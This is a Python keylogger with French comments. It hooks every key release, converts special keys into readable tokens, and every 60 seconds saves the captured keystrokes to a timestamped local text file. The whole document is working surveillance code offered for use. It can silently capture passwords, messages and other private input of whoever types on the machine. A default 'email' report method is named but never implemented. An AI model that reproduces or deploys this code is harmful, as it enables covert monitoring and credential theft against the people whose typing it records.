import keyboard # Importer le module pour keylog
# Timer pour pouvoir définir tous les combien on envoie un fichier
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60 # 60s = 1min ducoup


class Keylogger:
    def __init__(self, interval, report_method="email"):
        # on va SEND_REPORT_EVERY toutes les
        self.interval = interval
        self.report_method = report_method
        # le string qui contient tous les logs
        # les touches entre `self.interval`
        self.log = ""
        # enregistrer le début et la fin en datetime
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # touche spéciale
            # majuscules avec []
            if name == "space":
                # " " à la place de "espace"
                name = " "
            elif name == "enter":
                # revenir à la ligne quand retour à la ligne est pressé
                name = "\n"
            elif name == "decimal":
                name = "."
            elif name == "backspace":
                name = "[<=]"
            else:
                # remplace les espaces avec des _
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # enfin, ajouter à la variable `self.log` 
        self.log += name
    
    def update_filename(self):
        # construire le nom du fichier
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"Logs Clavier - du {start_dt_str} à {end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # ouvrir le fichier en write mode
        with open(f"{self.filename}.txt", "w") as f:
            # écrire les logs dedans
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        
            # s'il y a quelque chose en log, le report
        self.end_dt = datetime.now()
            # update `self.filename`
        self.update_filename()
        if self.report_method == "file":
            self.report_to_file()
            # si on veut le dire dans la console, enlever le # de la ligne d'avant
            # print(f"[{self.filename}] - {self.log}")
        self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set le thread à daemon "(dies when main thread die)""
        timer.daemon = True
        # démarrer le timer
        timer.start()

    def start(self):
        # enregistrer le temps au start
        self.start_dt = datetime.now()
        # start le keylogger
        keyboard.on_release(callback=self.callback)
        # report les keylogs
        self.report()
        # blocker le thread en cours et recommencer à ctrl + c
        keyboard.wait()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()